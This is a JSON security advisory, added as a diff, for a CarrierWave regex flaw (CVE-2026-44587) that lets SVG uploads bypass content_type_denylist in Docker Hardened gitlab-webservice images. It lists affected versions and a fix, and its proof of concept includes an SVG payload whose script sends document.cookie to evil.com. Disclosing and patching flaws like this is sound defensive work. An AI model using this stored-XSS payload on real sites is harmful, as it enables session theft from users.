@@ -1,0 +1,133 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-cter-atbf-zftc-qhar",
+  "modified": "2026-09-27T00:36:13Z",
+  "published": "2026-09-27T00:36:13Z",
+  "upstream": [
+    "CVE-2026-44587"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nCarrierWave's content_type_denylist check fails to escape regex metacharacters in string entries, causing the denylist to silently not match the content types it is intended to block.\n\n**Note**: CarrierWave is aware `#content_type_denylist is deprecated for the security reason`, but it still used by developers, and the problem here isn't denylist allows any filetype, and thats not a  vulnerability in carrierwave, its an implementation problem in developers using CarrierWave, the problem is its denylist entries are interpolated directly into a regex without `Regexp.quote` or anchoring. The denylist is still useful when developers want to ban specific content types but allow everything else.\n\n### Details\nIn `lib/carrierwave/uploader/content_type_denylist.rb:57`, string denylist entries are interpolated directly into a regex without `Regexp.quote` or anchoring:\n\n```ruby\ndef denylisted_content_type?(denylist, content_type)\n  Array(denylist).any? { |item| content_type =~ /#{item}/ }\nend\nThe entry \"image/svg+xml\" becomes the regex /image\\/svg+xml/ where + is a quantifier meaning \"one or more g\", not a literal +. This regex never matches the real MIME type \"image/svg+xml\" which contains a literal +.\nThis is inconsistent with the allowlist implementation at lib/carrierwave/uploader/content_type_allowlist.rb:53-57, which correctly applies both Regexp.quote and a \\A anchor:\nrubydef allowlisted_content_type?(allowlist, content_type)\n  Array(allowlist).any? do |item|\n    item = Regexp.quote(item) if item.class != Regexp\n    content_type =~ /\\A#{item}/\n  end\nend\n```\n\nOther affected MIME types include `application/xhtml+xml` and any type containing regex metacharacters.\n\nFix: Apply Regexp.quote for string entries and anchor with \\A, matching the existing allowlist implementation:\n```\nrubydef denylisted_content_type?(denylist, content_type)\n  Array(denylist).any? do |item|\n    item = Regexp.quote(item) if item.class != Regexp\n    content_type =~ /\\A#{item}/\n  end\nend\n```\n\n### PoC\n\n\n```\n app.rb\nrequire \"sinatra\"\nrequire \"carrierwave\"\nrequire \"fileutils\"\n\nFileUtils.mkdir_p(\"uploads/files\")\n\nCarrierWave.configure do |config|\n  config.root      = File.expand_path(\"uploads\")\n  config.store_dir = \"files\"\nend\n\nclass VaultUploader < CarrierWave::Uploader::Base\n  storage :file\n  def store_dir = \"files\"\n  def content_type_denylist = %w[image/svg+xml]\nend\n\npost \"/upload\" do\n  content_type :json\n  san = CarrierWave::SanitizedFile.new(\n    tempfile:     params[:file][:tempfile],\n    filename:     params[:file][:filename],\n    content_type: params[:file][:type]\n  )\n  uploader = VaultUploader.new\n  begin\n    uploader.store!(san)\n    { result: \"VULNERABLE\", message: \"SVG bypassed denylist\", path: uploader.path }.to_json\n  rescue CarrierWave::IntegrityError => e\n    { result: \"blocked\", message: e.message }.to_json\n  end\nend\n```\n\n```\nbundle exec ruby app.rb &\n\necho '<svg xmlns=\"http://www.w3.org/2000/svg\"><script>document.location=\"https://evil.com/?c=\"+document.cookie</script></svg>' > xss.svg\n\ncurl -X POST http://localhost:4567/upload \\\n  -F \"file=@xss.svg;type=image/svg+xml\"\n```\n\nExpected response (denylist working):\n```\njson{ \"result\": \"blocked\", \"message\": \"...\" }\n```\n\n\nActual response:\n```\njson{ \"result\": \"VULNERABLE\", \"message\": \"SVG bypassed denylist\", \"path\": \"...\" }\n```\n### Impact\nAny application that uses content_type_denylist to block image/svg+xml — the most common use case, specifically to prevent stored XSS — is silently unprotected. An attacker can upload an SVG file containing arbitrary",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "gitlab-webservice",
+        "purl": "pkg:docker/dhi/gitlab-webservice?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "18.11.1-debian13",
+        "18.11.1-debian13-dev",
+        "18.11.1-debian13-fips",
+        "18.11.1-debian13-fips-dev",
+        "18.11.11-debian13",
+        "18.11.11-debian13-dev",
+        "18.11.11-debian13-fips",
+        "18.11.11-debian13-fips-dev",
+        "18.11.3-debian13",
+        "18.11.3-debian13-dev",
+        "18.11.3-debian13-fips",
+        "18.11.3-debian13-fips-dev",
+        "18.11.4-debian13",
+        "18.11.4-debian13-dev",
+        "18.11.4-debian13-fips",
+        "18.11.4-debian13-fips-dev",
+        "18.11.5-debian13",
+        "18.11.5-debian13-dev",
+        "18.11.5-debian13-fips",
+        "18.11.5-debian13-fips-dev",
+        "18.11.6-debian13",
+        "18.11.6-debian13-dev",
+        "18.11.6-debian13-fips",
+        "18.11.6-debian13-fips-dev",
+        "18.11.7-debian13",
+        "18.11.7-debian13-dev",
+        "18.11.7-debian13-fips",
+        "18.11.7-debian13-fips-dev",
+        "18.11.8-debian13",
+        "18.11.8-debian13-dev",
+        "18.11.8-debian13-fips",
+        "18.11.8-debian13-fips-dev",
+        "18.11.9-debian13",
+        "18.11.9-debian13-dev",
+        "18.11.9-debian13-fips",
+        "18.11.9-debian13-fips-dev",
+        "19.1.2-debian13",
+        "19.1.2-debian13-dev",
+        "19.1.2-debian13-fips",
+        "19.1.2-debian13-fips-dev",
+        "19.1.3-debian13",
+        "19.1.3-debian13-dev",
+        "19.1.3-debian13-fips",
+        "19.1.3-debian13-fips-dev",
+        "19.1.4-debian13",
+        "19.1.4-debian13-dev",
+        "19.1.4-debian13-fips",
+        "19.1.4-debian13-fips-dev",
+        "19.1.6-debian13",
+        "19.1.6-debian13-dev",
+        "19.1.6-debian13-fips",
+        "19.1.6-debian13-fips-dev",
+        "19.1.7-debian13",
+        "19.1.7-debian13-dev",
+        "19.1.7-debian13-fips",
+        "19.1.7-debian13-fips-dev",
+        "19.1.8-debian13",
+        "19.1.8-debian13-dev",
+        "19.1.8-debian13-fips",
+        "19.1.8-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-cter-atbf-zftc-qhar"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-7g26-2qgj-chfg"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44587"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-7g26-2qgj-chfg"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2026-44587.yml"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/carrierwaveuploader/carrierwave/commit/4c4a005775a436c5165df014dc9b1874c227d86c"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/carrierwaveuploader/carrierwave/commit/21221cc6e260633f7da78c6133a88666a5529d27"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-44587"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-44587"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-44587"
+    }
+  ]
+}
